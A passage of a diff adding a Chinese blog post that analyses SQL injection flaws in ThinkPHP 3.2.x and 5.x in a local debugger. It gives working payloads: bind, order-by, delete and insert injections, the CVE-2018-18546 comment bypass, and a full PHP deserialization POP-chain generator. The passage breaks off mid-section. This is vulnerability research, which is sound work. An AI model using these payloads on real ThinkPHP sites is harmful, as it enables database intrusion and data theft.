+        $this-&gt;model = $options[&#39;model&#39;];
+        $this-&gt;parseBind(!empty($options[&#39;bind&#39;]) ? $options[&#39;bind&#39;] : array());
+        $table = $this-&gt;parseTable($options[&#39;table&#39;]);
+        $sql   = &#39;UPDATE &#39; . $table . $this-&gt;parseSet($data);
+        if (strpos($table, &#39;,&#39;)) &#123;
+// 多表更新支持JOIN操作
+            $sql .= $this-&gt;parseJoin(!empty($options[&#39;join&#39;]) ? $options[&#39;join&#39;] : &#39;&#39;);
+        &#125;
+        $sql .= $this-&gt;parseWhere(!empty($options[&#39;where&#39;]) ? $options[&#39;where&#39;] : &#39;&#39;);
+        if (!strpos($table, &#39;,&#39;)) &#123;
+            //  单表更新支持order和lmit
+            $sql .= $this-&gt;parseOrder(!empty($options[&#39;order&#39;]) ? $options[&#39;order&#39;] : &#39;&#39;)
+            . $this-&gt;parseLimit(!empty($options[&#39;limit&#39;]) ? $options[&#39;limit&#39;] : &#39;&#39;);
+        &#125;
+        $sql .= $this-&gt;parseComment(!empty($options[&#39;comment&#39;]) ? $options[&#39;comment&#39;] : &#39;&#39;);
+        return $this-&gt;execute($sql, !empty($options[&#39;fetch_sql&#39;]) ? true : false);
+    &#125;
+</code></pre>
+<p>这里看到了熟悉的<code>parseWhere()</code>,在这之前,<code>$sql   = &#39;UPDATE &#39; . $table . $this-&gt;parseSet($data);</code>会构建出部分sql语句</p>
+<p>但是sql语句是</p>
+<pre><code>UPDATE `users` SET `password`=:0
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704104828201.png" alt="image-20230704104828201"></p>
+<p><code>id=1&amp;password=aabb</code>–&gt;<code>save()</code>–&gt;<code>update()</code> –&gt;<code>parseWhere()</code>–&gt;<code>parseWhereItem()</code></p>
+<p>这里的和上面exp注入差不多，想办法进入<code>bind</code>分支</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704105214858.png" alt="image-20230704105214858"></p>
+<p>和exp注入一样修改get数据后成功进入</p>
+<pre><code>?id[0]=bind&amp;id[1]=1&amp;password=admin123
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704105506703.png" alt="image-20230704105506703"></p>
+<p>查看拼接后最后sql语句,这里就很有问题，反正我目前还没见过</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704105612143.png" alt="image-20230704105612143"></p>
+<p><code>parseWhere()</code>执行完后得到了奇怪的sql语句</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704105811692.png" alt="image-20230704105811692"></p>
+<p>在执行sql语句前的状态</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704110047806.png" alt="image-20230704110047806"></p>
+<p>跟进<code>execute()</code>查看</p>
+<p><code>id[0]=bind&amp;id[1]=1&amp;password=aabb</code>–&gt;<code>save()</code>–&gt;<code>update()</code> —&gt;<code>execute()</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704110455049.png" alt="image-20230704110455049"></p>
+<p>在这条代码里</p>
+<pre><code class="php">$this-&gt;queryStr = strtr($this-&gt;queryStr, array_map(function ($val) use ($that) &#123;return &#39;\&#39;&#39; . $that-&gt;escapeString($val) . &#39;\&#39;&#39;;&#125;, $this-&gt;bind))
+</code></pre>
+<p>array_map()是执行function,$this-&gt;bind为function的参数</p>
+<p>strtr()  把$this-&gt;queryStr字符串里面的</p>
+<p>整个过程将</p>
+<pre><code>UPDATE `users` SET `password`=:0 WHERE `id` = :1
+</code></pre>
+<p>修改为</p>
+<pre><code>UPDATE `users` SET `password`=&#39;admin123&#39; WHERE `id` = :1
+</code></pre>
+<p><code>:0</code>变成了<code>admin123</code>,就是<code>$this-&gt;bind</code>，但是<code>:1</code>没变</p>
+<p>如果get的是<code>id[0]=bind&amp;id[1]=0</code>,sql语句变成</p>
+<pre><code>UPDATE `users` SET `password`=:0 WHERE `id` = :0
+</code></pre>
+<p>经过替换后得到最终的sql语句</p>
+<pre><code>UPDATE `users` SET `password`=&#39;admin123&#39; WHERE `id` = &#39;admin123&#39;
+</code></pre>
+<p>然后执行</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704111630574.png" alt="image-20230704111630574"></p>
+<p>因为整个过程中并没有对id进行过滤，只有一个<code>:0</code>替换，<code>id[1]=0</code>后面的拼接没有处理</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704112103271.png" alt="image-20230704112103271"></p>
+<p>直接进行报错注入即可</p>
+<pre><code>http://127.0.0.1/index.php?id[0]=bind&amp;password=admin123&amp;id[1]=0 and updatexml(1,concat(0x7e,database(),0x7e),1)
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704112211737.png" alt="image-20230704112211737"></p>
+<h3 id="3-2-3-order-by注入"><a href="#3-2-3-order-by注入" class="headerlink" title="3.2.3  order by注入"></a>3.2.3  order by注入</h3><p>先在2.3.4跟新的地方，发现parseOrder存在大量跟新,漏洞大概率出现在这</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704125431131.png" alt="image-20230704125431131"></p>
+<p>控制器：</p>
+<pre><code class="PHP"> public function index()&#123;
+        $username = I(&quot;username&quot;);
+        $order = I(&quot;order&quot;);
+        $data = M(&quot;users&quot;)-&gt;where(array(&quot;username&quot;=&gt;$username))-&gt;order($order)-&gt;find();
+        dump($data);
+    &#125;
+</code></pre>
+<p>M只是实例化users对象，不管了，where也不是我们的利用点，我们也没对其进行操作，因此也跳过</p>
+<p><strong>疑问： order($order)是干嘛的？</strong>，只知道是给$order赋值</p>
+<p><code>username=admin&amp;order=1</code> –&gt;<code>find()</code>–&gt;<code>select()</code>–&gt;<code>buildSelectSql()</code>–&gt;<code>parseSql()</code></p>
+<p>在这里找到了<code>parseOrder</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704131151548.png" alt="image-20230704131151548"></p>
+<p>跟进<code>parseOrder</code></p>
+<pre><code class="php">protected function parseOrder($order)
+    &#123;
+        if (is_array($order)) &#123;
+            $array = array();
+            foreach ($order as $key =&gt; $val) &#123;
+                if (is_numeric($key)) &#123;
+                    $array[] = $this-&gt;parseKey($val);
+                &#125; else &#123;
+                    $array[] = $this-&gt;parseKey($key) . &#39; &#39; . $val;
+                &#125;
+            &#125;
+            $order = implode(&#39;,&#39;, $array);
+        &#125;
+        return !empty($order) ? &#39; ORDER BY &#39; . $order : &#39;&#39;;
+    &#125;
+</code></pre>
+<p>这里首先会判断$order是不是数组，如果不是，返回拼接，如果$order不为空，则拼接ORDER BY</p>
+<p>因为没有过滤，造成了sql注入</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704131936741.png" alt="image-20230704131936741"></p>
+<p>这里可以直接注入了</p>
+<pre><code>?username=admin&amp;order=1 and updatexml(1,concat(0x3a,database()),1)
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704132307868.png" alt="image-20230704132307868"></p>
+<h3 id="3-2-3-update注入"><a href="#3-2-3-update注入" class="headerlink" title="3.2.3  update注入"></a>3.2.3  update注入</h3><p> 看来网上的分析文章，其实就是上面分析的bind注入</p>
+<h3 id="3-2-3-delete注入"><a href="#3-2-3-delete注入" class="headerlink" title="3.2.3  delete注入"></a>3.2.3  delete注入</h3><p>(感觉还是where注入)</p>
+<p>控制器：</p>
+<pre><code class="php">public function index()&#123;
+        $id = I(&quot;id&quot;);
+        $res = M(&quot;users&quot;)-&gt;delete($id);
+    &#125;
+</code></pre>
+<p><code>id=5</code>–&gt;<code>delete()</code>–&gt;<code>delete()</code></p>
+<p>在这个方法里也是调用了一系列的parse方法，去构建sql语句</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704141846044.png" alt="image-20230704141846044"></p>
+<p><code>id=5</code>–&gt;<code>delete()</code>–&gt;<code>delete()</code>–&gt;<code>parseWhere()</code>–&gt;<code>parseWhereItem()</code></p>
+<p>经过这个方法后会构建出<code>WHERE id=5</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704142845933.png" alt="image-20230704142845933"></p>
+<p>尝试直接注入，得到奇怪的语句</p>
+<pre><code>id= 5%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704143310018.png" alt="image-20230704143310018"></p>
+<p>查看<code>parseWhere()</code>，如果传进的参数如果是字符串，而不是数组，就不会进入else，产生那个奇怪的sql语句</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704143837865.png" alt="image-20230704143837865"></p>
+<p><code>id[where]=5</code>,这个能进入if判断</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704144109802.png" alt="image-20230704144109802"></p>
+<p>然后直接跳转到最后的拼接，得到<code>where 5</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704144143733.png" alt="image-20230704144143733"></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704144231873.png" alt="image-20230704144231873"></p>
+<p>然后就进行注入尝试</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704144328843.png" alt="image-20230704144328843"></p>
+<p>似乎可以，报错注入</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704144425948.png" alt="image-20230704144425948"></p>
+<pre><code>http://127.0.0.1/index.php?id[where]=5 and updatexml(1,concat(0x7e,database(),0x7e),1)
+</code></pre>
+<h3 id="3-2-3-反序列化"><a href="#3-2-3-反序列化" class="headerlink" title="3.2.3 反序列化"></a>3.2.3 反序列化</h3><p>(感觉还是sql注入)</p>
+<p>控制器:</p>
+<pre><code class="php">public function index()&#123;
+    unserialize(base64_decode($_GET[&#39;ser&#39;]));
+&#125;
+</code></pre>
+<p>先找<code>__destruct</code>,因为这个魔法方法当反序列化时先调用，全局搜索后,</p>
+<p>找到<code>ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</code></p>
+<pre><code class="php"> public function __destruct()
+    &#123;
+        empty($this-&gt;img) || $this-&gt;img-&gt;destroy();
+    &#125;
+</code></pre>
+<p>这个img可以控制</p>
+<p>下一步就行找到一个能够调用<code>destroy</code>的类</p>
+<p>在<code>ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</code></p>
+<pre><code class="php">public function destroy($sessID)
+&#123;
+        return $this-&gt;handle-&gt;delete($this-&gt;sessionName . $sessID);
+&#125;
+</code></pre>
+<p>$this-&gt;handle可控，但是这是有参函数，在php7调用有参函数时不传参数会触发框架里的错误处理，切换php5就行</p>
+<p>下一步，找到delete()方法，在<code>ThinkPHP/Mode/Lite/Model.class.php</code></p>
+<pre><code class="php">public function delete($options = array())
+    &#123;
+      
+    &#125;
+</code></pre>
+<p>这个就是前面分析sql注入的delete方法</p>
+<p>里面会调用<code>ThinkPHP/Library/Think/Db/Driver.class.php</code>的delete方法</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704153926320.png" alt="image-20230704153926320"></p>
+<pre><code>public function delete($options = array())
+    &#123;
+        $this-&gt;model = $options[&#39;model&#39;];
+        $this-&gt;parseBind(!empty($options[&#39;bind&#39;]) ? $options[&#39;bind&#39;] : array());
+        $table = $this-&gt;parseTable($options[&#39;table&#39;]);
+        $sql   = &#39;DELETE FROM &#39; . $table;
+        if (strpos($table, &#39;,&#39;)) &#123;
+// 多表删除支持USING和JOIN操作
+            if (!empty($options[&#39;using&#39;])) &#123;
+                $sql .= &#39; USING &#39; . $this-&gt;parseTable($options[&#39;using&#39;]) . &#39; &#39;;
+            &#125;
+            $sql .= $this-&gt;parseJoin(!empty($options[&#39;join&#39;]) ? $options[&#39;join&#39;] : &#39;&#39;);
+        &#125;
+        $sql .= $this-&gt;parseWhere(!empty($options[&#39;where&#39;]) ? $options[&#39;where&#39;] : &#39;&#39;);
+        if (!strpos($table, &#39;,&#39;)) &#123;
+            // 单表删除支持order和limit
+            $sql .= $this-&gt;parseOrder(!empty($options[&#39;order&#39;]) ? $options[&#39;order&#39;] : &#39;&#39;)
+            . $this-&gt;parseLimit(!empty($options[&#39;limit&#39;]) ? $options[&#39;limit&#39;] : &#39;&#39;);
+        &#125;
+        $sql .= $this-&gt;parseComment(!empty($options[&#39;comment&#39;]) ? $options[&#39;comment&#39;] : &#39;&#39;);
+        return $this-&gt;execute($sql, !empty($options[&#39;fetch_sql&#39;]) ? true : false);
+    &#125;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704154233230.png" alt="image-20230704154233230"></p>
+<p>这里存在一个sql语句直接拼接，而且在前面的分析中没有对参数过滤，可以尝试用反序列化链造成sql注入</p>
+<p>在执行sql语句时，会调用<code>initConnect</code>进行初始化连接</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704154710379.png" alt="image-20230704154710379"></p>
+<p>跟进<code>initConnect</code>,</p>
+<pre><code class="php">protected function initConnect($master = true)
+    &#123;
+        if (!empty($this-&gt;config[&#39;deploy&#39;]))
+        // 采用分布式数据库
+        &#123;
+            $this-&gt;_linkID = $this-&gt;multiConnect($master);
+        &#125; else
+        // 默认单数据库
+        if (!$this-&gt;_linkID) &#123;
+            $this-&gt;_linkID = $this-&gt;connect();
+        &#125;
+
+    &#125;
+</code></pre>
+<p>跟进connect,这个$this-&gt;config可控</p>
+<pre><code class="php">public function connect($config = &#39;&#39;, $linkNum = 0, $autoConnection = false)
+    &#123;
+        if (!isset($this-&gt;linkID[$linkNum])) &#123;
+            if (empty($config)) &#123;
+                $config = $this-&gt;config;
+            &#125;
+
+            try &#123;
+                if (empty($config[&#39;dsn&#39;])) &#123;
+                    $config[&#39;dsn&#39;] = $this-&gt;parseDsn($config);
+                &#125;
+                if (version_compare(PHP_VERSION, &#39;5.3.6&#39;, &#39;&lt;=&#39;)) &#123;
+                    // 禁用模拟预处理语句
+                    $this-&gt;options[PDO::ATTR_EMULATE_PREPARES] = false;
+                &#125;
+                $this-&gt;linkID[$linkNum] = new PDO($config[&#39;dsn&#39;], $config[&#39;username&#39;], $config[&#39;password&#39;], $this-&gt;options);
+            &#125; catch (\PDOException $e) &#123;
+                if ($autoConnection) &#123;
+                    trace($e-&gt;getMessage(), &#39;&#39;, &#39;ERR&#39;);
+                    return $this-&gt;connect($autoConnection, $linkNum);
+                &#125; elseif ($config[&#39;debug&#39;]) &#123;
+                    E($e-&gt;getMessage());
+                &#125;
+            &#125;
+        &#125;
+        return $this-&gt;linkID[$linkNum];
+    &#125;
+</code></pre>
+<p>按照思路，构造POP链</p>
+<pre><code>__destruct()-&gt;destroy()-&gt;delete()-&gt;Driver::delete()-&gt;Driver::execute()-&gt;Driver::initConnect()-&gt;Driver::connect()
+</code></pre>
+<pre><code class="php">&lt;?php
+//初始化数据库连接
+namespace Think\Db\Driver&#123;
+    use PDO;
+    class Mysql&#123;
+        protected $config = array(
+            &quot;debug&quot;    =&gt; 1,
+            &quot;database&quot; =&gt; &quot;thinkphp&quot;,	//数据库名
+            &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;,	//地址
+            &quot;hostport&quot; =&gt; &quot;3306&quot;,	//端口
+            &quot;charset&quot;  =&gt; &quot;utf8&quot;,
+            &quot;username&quot; =&gt; &quot;root&quot;,	//用户名
+            &quot;password&quot; =&gt; &quot;123456&quot;	//密码
+        );
+    &#125;
+&#125;
+
+namespace Think\Image\Driver&#123;
+    use Think\Session\Driver\Memcache;
+    class Imagick&#123;
+        private $img;
+
+        public function __construct()&#123;
+            $this-&gt;img = new Memcache();
+        &#125;
+    &#125;
+&#125;
+
+namespace Think\Session\Driver&#123;
+    use Think\Model;
+    class Memcache&#123;
+        protected $handle;
+
+        public function __construct()&#123;
+            $this-&gt;handle = new Model();
+        &#125;
+    &#125;
+&#125;
+
+namespace Think&#123;
+    use Think\Db\Driver\Mysql;
+    class Model&#123;
+        protected $options   = array();
+        protected $pk;
+        protected $data = array();
+        protected $db = null;
+
+        public function __construct()&#123;
+            $this-&gt;db = new Mysql();
+            $this-&gt;options[&#39;where&#39;] = &#39;&#39;;
+            $this-&gt;pk = &#39;id&#39;;
+            $this-&gt;data[$this-&gt;pk] = array(
+                &quot;table&quot; =&gt; &quot;users where 1 and updatexml(1,concat(0x7e,database(),0x7e),1)#&quot;,
+                &quot;where&quot; =&gt; &quot;1=1&quot;
+            );
+        &#125;
+    &#125;
+&#125;
+
+namespace &#123;
+    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
+&#125;
+</code></pre>
+<h3 id="3-2-4-CVE-2018-18546（上面Order-by注入的绕过）"><a href="#3-2-4-CVE-2018-18546（上面Order-by注入的绕过）" class="headerlink" title="3.2.4 CVE-2018-18546（上面Order by注入的绕过）"></a>3.2.4 CVE-2018-18546（上面Order by注入的绕过）</h3><p>控制器：</p>
+<pre><code class="php">public function index()
+    &#123;
+        $obj = M(&#39;users&#39;);
+        $res = $obj-&gt;where(&#39;id=1&#39;)-&gt;order(I(&#39;id&#39;))-&gt;select();
+        echo $obj-&gt;getLastSql();//输出sql语句
+    &#125;
+</code></pre>
+<p>描述：</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707202352932.png" alt="image-20230707202352932"></p>
+<p>版本:3.2.4和3.2.5对比</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707202509308.png" alt="image-20230707202509308"></p>
+<p>这部分代码是漏洞出现的地方，也就是对order拼接前进行过滤处理的地方</p>
+<pre><code class="php">foreach (explode(&#39;,&#39;, $order) as $val) &#123;
+     if (preg_match(&#39;/\s+(ASC|DESC)$/i&#39;, rtrim($val), $match, PREG_OFFSET_CAPTURE)) &#123;
+            $array[] = $this-&gt;parseKey(ltrim(substr($val, 0, $match[0][1]))) . &#39; &#39; . $match[1][0];
+       &#125; elseif (false === strpos($val, &#39;(&#39;)) &#123;
+            $array[] = $this-&gt;parseKey($val);
+        &#125;
+</code></pre>
+<p>这个代码首先将$order进行以逗号<code>,</code>进行分割为数组，然后遍历这个数组</p>
+<p>然后按照不同规则进行处理，</p>
+<p>第一个是使用 <code>rtrim</code> 函数去除 <code>$val</code> 右侧的空格，并将结果作为 <code>preg_match</code> 函数的第二个参数。匹配结果将存储在数组 <code>$match</code> 中，然后使用 <code>substr</code> 函数截取出 <code>$val</code> 中 <code>$match[0][1]</code> 之前的部分（即去除了 <code>ASC</code> 或 <code>DESC</code> 部分），然后使用 <code>ltrim</code> 函数去除左侧的空格。使用 <code>$this-&gt;parseKey</code> 方法对处理后的部分进行进一步解析，并将结果与匹配到的排序方式（<code>ASC</code> 或 <code>DESC</code>）拼接成字符串，最后将其添加到数组 <code>$array</code> 中。</p>
+<p>第二个是使用 <code>strpos</code> 函数检查 <code>$val</code> 中是否包含左括号 <code>&#39;(&#39;</code>。如果不包含，则执行以下代码块。这里调用了 <code>$this-&gt;parseKey</code> 方法对 <code>$val</code> 进行解析，并将解析结果添加到数组 <code>$array</code> 中</p>
+<p>确保前面没有过滤后，直接在这段代码进行下断点调试：</p>
+<pre><code>输入：?id=updatexml(1,concat(0x7e,database(),0x7e),1)
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707211520419.png" alt="image-20230707211520419"></p>
+<p>这个会被分割为</p>
+<pre><code>[&#39;updatexml(1&#39;,&#39;concat(0x7e&#39;,&#39;database()&#39;,&#39;0x7e)&#39;,&#39;1)]
+</code></pre>
+<p>经过过滤处理最终满足条件的就只有最后两个</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707210348075.png" alt="image-20230707210348075"></p>
+<p>为了让数组中每一位都能满足条件需要进行绕过：存在<code>(</code>的，使用sql语句中的注释进行绕过，在注释中添加<code>ASC</code>或者<code>DESC</code>，使得它走的是第一个if</p>
+<p>不存在<code>(</code>的，适当构建<code>/**/</code>和<code>,</code> ,为了构造分割和sql语句注释的完整</p>
+<pre><code>[&#39;updatexml(1&#39;,&#39;concat(0x7e&#39;,&#39;database()&#39;,&#39;0x7e)&#39;,&#39;1)]
+</code></pre>
+<p> 处理后的数组：</p>
+<pre><code>[&#39;updatexml/*&#39;,&#39;*/(/*%20ASC&#39;,&#39;*/1&#39;,&#39;concat/*&#39;,&#39;*/(/*%20ASC&#39;,&#39;*/0x7e&#39;,&#39;database/*&#39;,&#39;*/(/*%20ASC&#39;,&#39;*/)&#39;,&#39;0x7e)&#39;,&#39;1)]
+</code></pre>
+<p>最后的payload：</p>
+<pre><code>updatexml/*,*/(/*%20ASC,*/1,concat/*,*/(/*%20ASC,*/0x7e,database/*,*/(/*%20ASC,*/),0x7e),1)
+</code></pre>
+<p>成功绕过：</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707211835078.png" alt="image-20230707211835078"></p>
+<p>后面就是将order拼接<code>ORDER BY</code> 拼接到sql语句中执行了</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707211923350.png" alt="image-20230707211923350"></p>
+<h3 id="3-2-4-CVE-2018-18529"><a href="#3-2-4-CVE-2018-18529" class="headerlink" title="3.2.4 CVE-2018-18529"></a>3.2.4 CVE-2018-18529</h3><p>漏洞描述：ThinkPHP 3.2.4存在SQL注入漏洞，该漏洞是由于Library&#x2F;Think&#x2F;Db&#x2F;Driver&#x2F;Mysql.class.php文件中的parseKey函数对key变量处理不当所致。注意：攻击URI中不需要使用反引号字符</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707212638957.png" alt="image-20230707212638957"></p>
+<p>对比官方的修复:</p>
+<p>这里是添加了对$key变量的过滤</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707213059131.png" alt="image-20230707213059131"></p>
+<p>这个函数在sql相操作中频繁使用 ，下面是完整代码：</p>
+<pre><code class="php">protected function parseKey($key, $strict = false)
+    &#123;
+        $key = trim($key);
+        if ($strict || (!is_numeric($key) &amp;&amp; !preg_match(&#39;/[,\&#39;\&quot;\*\(\)`.\s]/&#39;, $key))) &#123;
+            $key = &#39;`&#39; . $key . &#39;`&#39;;
+        &#125;
+        return $key;
+    &#125;
+</code></pre>
+<p>首先，代码使用trim函数去除$key的首尾空格，确保处理的字符串没有多余的空白字符。</p>
+<p>接下来，通过条件判断语句，检查strict的值和和key的内容，决定是否对$key进行进一步处理。</p>
+<p>如果strict为true，或者key不是一个数字，并且不匹配正则表达式（该正则表达式用于检查$key中是否包含逗号、单引号、双引号、星号、括号、反引号、点号或空白字符），则执行下面的代码块。</p>
+<p>在这个代码块中key前后分别添加了反引号（‘），形成了一个包裹着key的字符串。这样做是为了在后续的数据库查询中使用$key作为字段名或表名时，确保其被正确解析和识别。</p>
+<p>最后，返回经过处理的$key。</p>
+<p>可以看到，这个函数无论如何都会返回$key, 说明这里构造恶意的$key也会正常返回</p>
+<p>测试：</p>
+<p>控制器如下：</p>
+<pre><code class="php">public function index()
+    &#123;
+        $count = I(&#39;get.count&#39;);
+        $m = M(&#39;users&#39;)-&gt;count($count);
+        echo $m;
+    &#125;
+</code></pre>
+<pre><code>?count=id
+</code></pre>
+<p>在这个函数断点调试</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707230038151.png" alt="image-20230707230038151"></p>
+<p>程序第一次获取到的key是数据库中的表名，并且满足if条件将其添加反引号返回</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707230249953.png" alt="image-20230707230249953"></p>
+<p>第二次获取到的是<code>COUNT(id) AS tp_count</code> 直接返回，这个是由于调用count的时候触发ThinkPHP&#x2F;Library&#x2F;Think&#x2F;Model.class.php::__call()</p>
+<p>在调用<code>getField</code>的时候进行的拼接</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707231116054.png" alt="image-20230707231116054"></p>
+<p>当执行sql语句前，获取到的sql语句如下：</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707231602039.png" alt="image-20230707231602039"></p>
+<p>可以直接根据这个进行构造sql语句进行注入</p>
+<pre><code class="php">?count=id) or (select database()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707232743059.png" alt="image-20230707232743059"></p>
+<p>sqlmap：</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707232815182.png" alt="image-20230707232815182"></p>
+<h3 id="3-1-3-CVE-2018-10225"><a href="#3-1-3-CVE-2018-10225" class="headerlink" title="3.1.3 CVE-2018-10225"></a>3.1.3 CVE-2018-10225</h3><p>（环境出错）</p>
+<h2 id="ThinkPHP-5-x"><a href="#ThinkPHP-5-x" class="headerlink" title="ThinkPHP 5.x"></a>ThinkPHP 5.x</h2><p>开发手册：<a target="_blank" rel="noopener" href="https://static.kancloud.cn/manual/thinkphp5/118003">https://static.kancloud.cn/manual/thinkphp5/118003</a></p>
+<h3 id="5-0-15-ParseData方法注入"><a href="#5-0-15-ParseData方法注入" class="headerlink" title="5.0.15 ParseData方法注入"></a>5.0.15 ParseData方法注入</h3><p>影响版本： <strong>5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15</strong> 、 <strong>5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5</strong> </p>
+<p>环境安装</p>
+<pre><code>composer create-project --prefer-dist topthink/think=5.0.15 thinkphp5.0.15
+</code></pre>
+<p>开启 application&#x2F;config.php 中的 app_debug 和 app_trace </p>
+<p>控制器：</p>
+<pre><code class="php"> public function index()
+    &#123;
+        $name = request()-&gt;get(&#39;name&#39;);
+        var_dump($name);
+//        $result = Db::table(&#39;test&#39;)-&gt;insert([&#39;name&#39; =&gt; $name,&#39;password&#39;=&gt;&#39;123456&#39;]);
+        $result = db(&#39;test&#39;)-&gt;insert([&#39;name&#39; =&gt; $name,&#39;password&#39;=&gt;&#39;123456&#39;]);
+        return dump($result);
+    &#125;
+</code></pre>
+<p>5.0.15和5.0.16版本对比，发现其修改的 <strong>Builder.php</strong> 文件代码</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704201241633.png" alt="image-20230704201241633"></p>
+<p>调试分析：</p>
+<p><code>name=ww</code> –&gt;<code>insert</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704201928517.png" alt="image-20230704201928517"></p>
+<p>到这里发现另一个<code>insert</code>方法，这个是生成sql语句的地方，跟进去看看</p>
+<pre><code>name=ww --&gt;insert--&gt;insert
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704202201864.png" alt="image-20230704202201864"></p>
+<p>在这发现了官方修改的函数<code>parseData</code>,跟进看看</p>
+<pre><code>name=ww --&gt;insert--&gt;insert--&gt;parseData
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704202757576.png" alt="image-20230704202757576"></p>
+<p>发现没有进入到跟新的地方，直接往下生成预处理数据</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704203014828.png" alt="image-20230704203014828"></p>
+<p>要进入里面，需要满足<code>$val</code>是数组</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704203405087.png" alt="image-20230704203405087"></p>
+<p>可以发现，如果能够进入switch case，这里没有进行预处理，并且是直接拼接返回</p>
+<p>尝试传入数组，name[0]&#x3D;aa,并且把</p>
+<pre><code>$name = request()-&gt;get(&#39;name&#39;);
+</code></pre>
+<p>修改为</p>
+<pre><code>$name = request()-&gt;get(&#39;name/a&#39;);
+</code></pre>
+<p>表示数据类型转换为数组</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704203856291.png" alt="image-20230704203856291"></p>
+<p>这里已经成功进入，按照跟新的地方，这里修改为</p>
+<pre><code>name[0]=inc
+</code></pre>
+<p>后面还有$val[1]和$val[2]</p>
+<p>所以要添加够参数</p>
+<pre><code>name[0]=inc&amp;&amp;name[1]=aaa&amp;&amp;name[2]=bbb
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704204332433.png" alt="image-20230704204332433"></p>
+<p>运行返回到第一个insert方法</p>
+<p>发现已经拼接好的sql语句，往下就是获取参数绑定和执行了</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704204531375.png" alt="image-20230704204531375"></p>
+<p>执行报错了</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704204759216.png" alt="image-20230704204759216"></p>
+<pre><code>name[1]=aa改为name[1]=aa’
+</code></pre>
+<p>出现sql语句报错</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704204840371.png" alt="image-20230704204840371"></p>
+<p>直接在name[1]进行注入</p>
+<pre><code>http://127.0.0.1/index.php?name[0]=inc&amp;&amp;name[1]=updatexml(1,concat(0x7,database(),0x7e),1)&amp;name[2]=aaa
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704205043250.png" alt="image-20230704205043250"></p>
+<h3 id="5-1-6-paraArraryData方法注入"><a href="#5-1-6-paraArraryData方法注入" class="headerlink" title="5.1.6 paraArraryData方法注入"></a>5.1.6 paraArraryData方法注入</h3><p>影响版本： <strong>5.1.6&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.7</strong></p>
+<p>下载环境</p>
+<pre><code>composer create-project --prefer-dist topthink/think=5.1.6 thinkphp5.1.6
+</code></pre>
+<p>开启 config&#x2F;app.php 中的 app_debug 和 app_trace </p>
+<p>控制器</p>
+<pre><code class="php">public function index()
+    &#123;
+        $password = request()-&gt;get(&#39;password&#39;);
+        db(&#39;test&#39;)-&gt;where([&#39;name&#39; =&gt; &#39;bb&#39;])-&gt;update([&#39;password&#39; =&gt; $password]);
+        return &#39;Update success&#39;;
